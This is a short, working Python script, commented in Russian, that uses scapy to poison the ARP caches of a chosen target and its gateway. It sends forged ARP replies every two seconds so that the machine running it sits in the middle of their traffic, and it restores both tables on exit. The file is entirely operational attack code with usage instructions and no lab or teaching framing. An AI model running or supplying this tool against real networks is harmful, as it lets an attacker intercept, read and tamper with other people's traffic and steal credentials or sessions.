"""
Запуск: sudo python3 arp_spoof.py <target_ip> <gateway_ip>
"""
import sys
import time
from scapy.all import ARP, Ether, send, getmacbyip, conf

conf.verb = 0  # Отключаем лишний вывод

def get_mac(ip):
    mac = getmacbyip(ip)
    if mac is None:
        print(f"[-] Не удалось получить MAC для {ip}")
        sys.exit(1)
    return mac

def spoof(target_ip, target_mac, spoof_ip):
    packet = ARP(
        op=2,                # op=2 = ARP reply
        pdst=target_ip,      # кому отвечаем (IP жертвы)
        hwdst=target_mac,    # MAC жертвы
        psrc=spoof_ip        # какой IP мы "подделываем" (шлюз)
    )
    send(packet)

def restore(target_ip, target_mac, source_ip, source_mac):
    packet = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    send(packet, count=5)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Использование: sudo python3 arp_spoof.py <target_ip> <gateway_ip>")
        sys.exit(1)

    target_ip, gateway_ip = sys.argv[1], sys.argv[2]

    target_mac  = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    print(f"[*] Target MAC: {target_mac}")
    print(f"[*] Gateway MAC: {gateway_mac}")
    print("[*] Отравление ARP-кэша начато (Ctrl+C для остановки)")

    try:
        sent = 0
        while True:
            spoof(target_ip, target_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, target_ip)
            sent += 2
            print(f"\r[*] Отправлено пакетов: {sent}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Восстановление ARP-таблиц...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[+] Готово.")